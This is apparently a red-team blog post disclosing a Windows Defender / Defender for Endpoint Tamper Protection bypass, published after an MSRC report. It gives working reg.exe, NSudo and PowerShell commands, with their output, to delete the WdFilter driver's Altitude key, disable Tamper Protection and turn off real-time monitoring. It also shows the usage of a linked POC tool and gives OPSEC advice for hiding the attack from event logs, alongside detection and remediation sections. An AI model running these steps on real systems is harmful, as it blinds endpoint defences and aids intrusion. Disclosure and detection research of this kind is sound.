---
title: Disabling Tamper Protection and other components of Defender / MDE
date: 2024-04-08 09:48:47 +07:00
categories: RedTeaming
#modified: 20-08-29 09:24:47 +07:00
#tags: [blog, netlify, jekyll, github]
description: Crashing WdFilter to disable Tamper Protection and other Defender / MDE components
#thumbnail: "https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/redteaming/Paces_Review/lab.png"
#image: "https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/redteaming/Paces_Review/lab.png"
---

## Disclosure Timeline

- Sep 23, 2022 - Initial discovery
- Jan 5, 2024 - Reported with POC through MSRC portal.
- Jan 11, 2024 - MSRC team confirmed. MSRC ticket was moved to Review / Repro.
- Mar 7, 2024 - MSRC status was changed to Complete stating "unable to reproduce this issue."
- Mar 28, 2024 - Public release of Blog and POC.

## Platform

This vulnerability, as of this writing affects updated versions of Windows server 2022, Windows 10 and Windows 11 until BuildLabEx Version: 22621.1.amd64fre.ni_release.220506-1250 (Win11 22H2 22621.1105 - Sep 2023 update). 
Even though Windows Server 2019 doesn't support Tamper Protection, the POC can still be leveraged to disable Defender / MDE.

## Summary

With the introduction of Tamper Protection, it has now become harder to disable Defender settings as an adversary. This is due to the fact that Tamper Protection and other Defender registry settings are protected by a Kernel-mode driver called WdFilter.sys.
It is possible to abuse SYSTEM / TrustedInstaller privileges to tamper WdFilter settings and unload the kernel minidriver to disable Tamper protection and other Defender components. This also affects Microsoft's Defender for Endpoint (MDE), blinding MDE of telemetry and activity performed on a target.

A POC has been crafted along with explanation of the vulnerability with methods of remediation and possibilities to enhance the efficiency / OPSEC of the current technique.

Below is a sample screenshot showcasing the POC crafted to abuse this bypass and disable WdFilter, Tamper Protection and Real-time monitoring (AMSI) on a target updated Server 2022 MDE testlab instance.

![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/redteaming/Bypass-Tamper-Protection/Images/Pasted%20image%2020240311143923.png)


## Description

Tamper Protection in Windows Security **helps prevent malicious apps from changing important Microsoft Defender Antivirus settings**, including real-time protection and cloud-delivered protection. With the introduction of Tamper Protection, it is not possible to disable Defender settings using commands such as `Set-MpPreference -DisableRealtimeMonitoring $true`.

To disable Tamper Protection via registry, the registry subkey - `TamperProtection` located at `HKLM\SYSTEM\CurrentControlSet\Services\WinDefend` should be set from `5` to `0/4`.  
It is not possible to modify registry subkey values at `HKLM\SYSTEM\CurrentControlSet\Services\WinDefend` even using SYSTEM / TrustedInstaller privileges on newer windows versions because "**Windows Defender has a kernel-mode driver (WdFilter.sys) that registers a Registry callback filter which protects Defender’s registry keys**." 

![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/redteaming/Bypass-Tamper-Protection/Images/Pasted%20image%2020221124161502.png)

In short, the Defender protection chain is as follows: 
*WdFilter (prevents Tamper protection and other defender registry key alteration) → Tamper Protection (prevents Defender settings alteration) → Defender settings and registry keys enable AV / MDE on the target (RealTimeMonitoring / IOAVProtection etc.)*

To disable Defender / MDE settings, it is required to disable these prior protections (WdFilter + Tamper Protection regkey) safeguarding it.

In theory, if it is possible to unload, crash / stop the WdFilter kernel minidriver from running, the Defender service can be stopped from using the WdFilter kernel minidriver from processing events and intern protecting Tamper Protection and other Defender's Registry Keys, after which it should be possible to disable Tamper Protection and other settings such as RealTimeMonitoring.

Trying to unload the WdFilter kernel minidriver using administrator privileges results in an error.

```
C:\Windows\System32> fltmc

Filter Name                     Num Instances    Altitude    Frame
------------------------------  -------------  ------------  -----
bindflt                                 0       409800         0
WdFilter                                4       328010         0
storqosflt                              0       244000         0
wcifs                                   0       189900         0
CldFlt                                  0       180451         0
FileCrypt                               0       141100         0
luafv                                   1       135000         0
npsvctrig                               1        46000         0
Wof                                     1        40700         0

C:\Windows\System32> fltmc unload WdFilter
Unload failed with error: 0x801f0010
Do not detach the filter from the volume at this time.
```

### Disabling Wdfilter by removing Altitude Numbers

[Sektor7](https://institute.sektor7.net/rto-maldev-intermediate) showcased that by changing the "Altitude number" of the Sysmon Kernel Minidriver to that of an already existing minidriver it is possible to break Sysmons functionality and disrupt the Sysmon Minidriver from processing events. It is possible to take inspiration from this technique to disrupt Defender's WdFilter minidriver and its kernel processing events.

Since it isn't possible to unload the WdFilter kernel minidriver using elevated privileges such as SYSTEM / TrustedInstaller (using a command like: `fltmc unload WdFilter`), one method that did work is to use such privileges to crash the WdFilter service by removing or altering an important registry subkey like the "Altitude number" of the WdFilter Kernel Minidriver.

From above, it is noted that the WdFilter kernel minidriver has an altitude number of: `328010`

Querying registry in a PowerShell administrator session (`HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WdFilter`), it is found that SYSTEM is the OWNER of this regkey and has FULL CONTROL privileges.

```
PS C:\Users\Administrator> 
$registryKeyPath = "HKLM:\SYSTEM\CurrentControlSet\Services\WdFilter"
$acl = Get-Acl -Path $registryKeyPath
$acl

Path                                                                                              Owner
Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WdFilter NT AUTHORITY\SYSTEM 
```

![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/redteaming/Bypass-Tamper-Protection/Images/Pasted%20image%2020221124163404.png)

It is possible to impersonate such privileges to run a Command Prompt with SYSTEM / TrustedInstaller contexts, enabling all privileges and Integrity Levels. Some notable tools that can do this are [NSudo](https://github.com/M2Team/NSudo/releases),  [superUser](https://github.com/mspaintmsi/superUser) and [PSExec](https://learn.microsoft.com/en-us/sysinternals/downloads/psexec).

In this case, Nsudo has been used to create a cmd.exe process as SYSTEM (S) / TrustedInstaller (T), enabling all privileges (E): 

```
# Run as SYSTEM context
C:\Users\Administrator> "C:\Tools\NSudo_8.2_All_Components\NSudo Launcher\x64\NSudoLC.exe" -U:S -P:E cmd

OR

# Run as TrustedInstaller context
C:\Users\Administrator> "C:\Tools\NSudo_8.2_All_Components\NSudo Launcher\x64\NSudoLC.exe" -U:S -P:E cmd

# New command prompt with elevated privileges
C:\Tools\NSudo_8.2_All_Components\NSudo Launcher\x64> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== =======
SeCreateTokenPrivilege                    Create a token object                                              Enabled
SeAssignPrimaryTokenPrivilege             Replace a process level token                                      Enabled
SeLockMemoryPrivilege                     Lock pages in memory                                               Enabled
[snip]
```

Upon attempting to execute the reg.exe command to delete the "Altitude number" associated with the WdFilter driver, it was confirmed that the operation was successful.

```
C:\Tools\NSudo_8.2_All_Components\NSudo Launcher\x64> reg delete "HKLM\SYSTEM\CurrentControlSet\Services\WdFilter\Instances\WdFilter Instance" /v Altitude /f
The operation completed successfully.
````

Next, reboot the computer (recommended) or wait a few minutes (inconsistent: ~20 mins) for the changes to take effect.

```
C:\Tools\NSudo_8.2_All_Components\NSudo Launcher\x64> shutdown /r /t 0
```

It is noted that the WdFilter kernel minidriver fails to load on the next reboot because the Altitude registry subkey has been deleted breaking its functionality.

```
C:\Users\Administrator> fltmc

Filter Name                     Num Instances    Altitude    Frame
------------------------------  -------------  ------------  -----
bindflt                                 0       409800         0
storqosflt                              0       244000         0
wcifs                                   0       189900         0
CldFlt                                  0       180451         0
FileCrypt                               0       141100         0
luafv                                   1       135000         0
npsvctrig                               1        46000         0
Wof                                     1        40700         0
```

Now that the WdFilter kernel minidriver is no longer loaded and protecting the Defender Registry Keys, successfully proceed to disable these unprotected keys, in this case the Tamper Protection regkey as it is the next protection chain in line to finally in turn disable defender protections like RealTimeMonitoring.

Continue disabling Tamper Protection using reg.exe in the newly spawned NSudo elevated prompt as before by setting the `TamperProtection` subkey to `4/0`:

```
# Command prompt with elevated privileges
C:\Tools\NSudo_8.2_All_Components\NSudo Launcher\x64> reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Features" /v TamperProtection /t REG_DWORD /d 4 /f
The operation completed successfully.
```

Finally, since Tamper Protection is now disabled leaving Defender / MDE settings vulnerable to change, disable AV and AMSI in a standard PowerShell Administrator prompt (SYSTEM / TrustedInstaller privileges are not mandatory) using the following commands:

```
# Disable realtime monitoring altogether
PS C:\Users\Administrator> Set-MpPreference -DisableRealtimeMonitoring $true

# Only disables scanning for downloaded files or attachments
PS C:\Users\Administrator> Set-MpPreference -DisableIOAVProtection $true
```

![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/redteaming/Bypass-Tamper-Protection/Images/Pasted%20image%2020221124183431.png)

*NOTE: Even though Tamper Protection is effectively disabled now, it takes a a reboot to render the same change in the "Security Settings" GUI Prompt.*

![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/redteaming/Bypass-Tamper-Protection/Images/Pasted%20image%2020221124183731.png)

The attack chain can be summarized as follows:

![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/redteaming/Bypass-Tamper-Protection/Images/edited.png)



## Proof of Concept

A POC has been included, written in C++ called Disable-TamperProtection can be found on GitHub here: <https://github.com/m3rcer/Disable-TamperProtection>

*NOTE: VC_redist.x64.exe could be required on the target.*

Required elevated privileges to perform the attack have been incorporated in the POC by borrowing Code from the [superUser](https://github.com/mspaintmsi/superUser) project codebase for TrustedInstaller privilege impersonation. 

POC Demo: <https://www.youtube.com/watch?v=aGTrjDxMSdU>

The POC works in 3 steps:

```
C:\Users\User\Desktop> .\Disable-TamperProtection.exe
Sequential Usage: 1 --> 2 --> 3
1:      Unload WdFilter
2:      Disable Tamper Protection
3:      Disable AV/MDE
4:      Restore AV/MDE settings
```

An example, to use this POC is as follows:

1) Unload WdFilter:

```
C:\Users\User\Desktop> .\Disable-TamperProtection.exe 1
[+] WdFilter Altitude Registry key Value: 328010
[+] Trusted Installer handle: 0000000000000120
[!] Spawning registry with TrustedInstaller privileges to delete WdFilter "Altitude" regkey.
[+] Created process ID: 3744 and assigned additional token privileges.
[+] Execute option 1 to validate!

C:\Users\User\Desktop>.\Disable-TamperProtection.exe 1
[+] WdFilter Altitude Registry key has been successfully deleted.
[+] Enumerating WdFilter information:
        Next:   0 | Frame ID:   0 | No. of Instances:   4 | Name:        wdfilter | Altitude:          328010
[+] Restart the system or wait a few minutes for WdFilter to unload.
[+] Execute option 1 to validate!

# Restart or wait a few minutes to crash and unload WdFilter
C:\Users\User\Desktop>.\Disable-TamperProtection.exe 1
[+] WdFilter Altitude Registry key has been successfully deleted.
[+] WDFilter has been successfully unloaded, use option 2 to disable Tamper Protection.
```

2) Disable Tamper Protection:

```
C:\Users\User\Desktop>.\Disable-TamperProtection.exe 2
[+] WdFilter Altitude Registry key has been successfully deleted.
[+] Trusted Installer handle: 00000000000000C4
[!] Spawning registry with TrustedInstaller privileges to alter Defender "TamperProtection" regkey from 5 to 4.
[+] Created process ID: 7748 and assigned additional token privileges.
[+] Use option '3' to finally Disable AV/MDE.
```

3) Disable Defender / MDE:

```
C:\Users\User\Desktop>.\Disable-TamperProtection.exe 3
[+] WdFilter Altitude Registry key has been successfully deleted.
[+] Trusted Installer handle: 000000000000011C
[!] Spawning registry with TrustedInstaller privileges to Disable 'RealtimeMonitoring' regkey.
[+] To disable other components of defender check source.
[+] Created process ID: 8040 and assigned additional token privileges.
```

*NOTE: Even though Tamper Protection is effectively disabled now, it takes a reboot to render the same change in the "Security Settings" GUI Prompt.*

The POC manages to semi-permanently disable Real time monitoring (gray out) after Tamper Protection is disabled. This can be remediated using option 4.

![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/redteaming/Bypass-Tamper-Protection/Images/Pasted%20image%2020240311143923.png)

4) Optionally reinstate the WdFilter minidriver, TamperProtection and Defender Settings (RealTimeMonitoring) utilizing option 4. Make sure to change the Altitude number (Default: 328010) back to it's original value at line 530 in the POC.  

```
# Restart the computer to restore settings successfully
C:\Users\User\Desktop>.\Disable-TamperProtection.exe 4
[+] WdFilter Altitude Registry key has been successfully deleted.
[+] Make sure to change Altitude in Source (Default: 328010) and reboot computer after execution.
[+] Trusted Installer handle: 0000000000000120
[!] Spawning registry with TrustedInstaller privileges to Enable 'RealtimeMonitoring' regkey.
[+] Created process ID: 5852 and assigned additional token privileges.
[!] Spawning registry with TrustedInstaller privileges to Enable 'TamperProtection' regkey.
[+] Created process ID: 2744 and assigned additional token privileges.
[!] Spawning registry with TrustedInstaller privileges to restore WdFilter "Altitude" regkey.
[+] Created process ID: 7044 and assigned additional token privileges.
```

The CodeBase in the Disable-TamperProtection POC can be altered to disable specific or all components of Defender / MDE. These have been included as comments in the POC at line 338. 

![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/redteaming/Bypass-Tamper-Protection/Images/Pasted%20image%2020231227155027.png)

An example to chain / add parts to disable more than one component together is yet again showcased in comments at line 382. Uncomment these lines and replace in accordance.

![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/redteaming/Bypass-Tamper-Protection/Images/Pasted%20image%2020231227155153.png)

## Impact against MDE

Testing the exploit POC against a target Windows machine (Server 2022, Win10 and Win11 until Win11 22H2 22621.1105) with MDE enabled, it is found that Tamper Protection can successfully be disabled along with other Defender settings with little noise.

## Detection and Alerts

Alerts and detections can be used to build basic telemetry and detections for this attack.
Testing the POC with latest Windows Defender Signatures as of this writing resulted in no detections. Testing the POC with MDE enabled results in whitelisted execution with the following alerts raised.

**Alert 1:** Suspicious process reparenting detected: This alert is generated when a process is spawned under TrustedInstaller to gain its privileges.

![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/redteaming/Bypass-Tamper-Protection/Images/Pasted%20image%2020231211123832.png)

![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/redteaming/Bypass-Tamper-Protection/Images/Pasted%20image%2020231211123417.png)

**Alert 2:** Tampering with Microsoft Defender for Endpoint sensor settings: This alert is generated upon deletion of the WdFilter Altitude regkey.

![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/redteaming/Bypass-Tamper-Protection/Images/Pasted%20image%2020231211123519.png)


## Resolution, Telemetry and related OPSEC

Apart from logs generated by the attack using NSudo / the POC and privileged access, An `Information Event` is generated on every reboot with an `EVENT ID: 7026`, stating that the "WdFilter driver failed to load".

![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/redteaming/Bypass-Tamper-Protection/Images/Pasted%20image%2020221124184543.png)

This could be used as a good IoC if the WdFilter driver fails to load each time on a reboot. 

To evade the above event and improve the OPSEC for this attack, add the original deleted Altitude number back using SYSTEM / TrustedInstaller privileges (using NSudo / superUser) as before to restore the WdFilter minidriver using reg.exe.

Tamper Protection would still be disabled, allowing the ability to modify / disable RealTimeMonitoring and other settings while avoiding the above log event from a future reboot.

```
# Command prompt with elevated privileges
C:\Tools\NSudo_8.2_All_Components\NSudo Launcher\x64> reg add "HKLM\SYSTEM\CurrentControlSet\Services\WdFilter\Instances\WdFilter Instance" /v Altitude /t REG_SZ /d 328010 /f
The operation completed successfully.
```

Reboot the computer to make the changes effective. The WdFilter minidriver is restored back to it's original state, leaving Tamper Protection and Real-Time Protection still disabled. This improves the attacks overall OPSEC avoiding the above-mentioned Event ID.

![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/redteaming/Bypass-Tamper-Protection/Images/Pasted%20image%2020221124190217.png)

To restore Tamper Protection back to its original "enabled" state, perform the same process as above with an elevated NSudo prompt, setting the `TamperProtection` subkey value back to `5`: 

```
# Command prompt with elevated privileges
C:\Tools\NSudo_8.2_All_Components\NSudo Launcher\x64> reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Features" /v TamperProtection /t REG_DWORD /d 5 /f
The operation completed successfully.
```

![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/redteaming/Bypass-Tamper-Protection/Images/Pasted%20image%2020221124190959.png)

After performing a reboot, Tamper Protection re-enables along with Real-Time Protection and restores it back to its original protected state. Real-Time Protection can optionally be manually re-enabled in an Admin PowerShell session using:

```
# Enable realtime monitoring altogether
PS C:\Users\Administrator> Set-MpPreference -DisableRealtimeMonitoring $false

# Enables scanning for downloaded files or attachments
PS C:\Users\Administrator> Set-MpPreference -DisableIOAVProtection $false
```

The Proof of Concept (POC) incorporates functionality to reinstate the WdFilter minidriver, Tamper Protection and Defender settings based on this concept.

![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/master/_posts/redteaming/Bypass-Tamper-Protection/Images/Pasted%20image%2020221124191854.png)

## Remediation

To remediate this vulnerability, avoid permitting TrustedInstaller privileges to alter and delete the `HKLM\SYSTEM\CurrentControlSet\Services\WdFilter\Instances\WdFilter Instance\Altitude` registry key. 
A safer and a more favorable measure would be to protect all Defender registry keys subject to alteration using SYSTEM / TrustedInstaller privileges as patched in Windows 11 above BuildLabEx Version: 22621.1.amd64fre.ni_release.220506-1250 (Win11 22H2 22621.1105).

## Credits

- [Sektor7's evasion course](https://institute.sektor7.net/rto-win-evasion)
- [NSudo](https://github.com/M2Team/NSudo/releases)
- [superUser](https://github.com/mspaintmsi/superUser)
- [Research paper on Blinding Defender](https://arxiv.org/ftp/arxiv/papers/2210/2210.02821.pdf)
- [MDEInternals by FalconForce](https://www.first.org/resources/papers/conf2022/MDEInternals-FIRST.pdf)



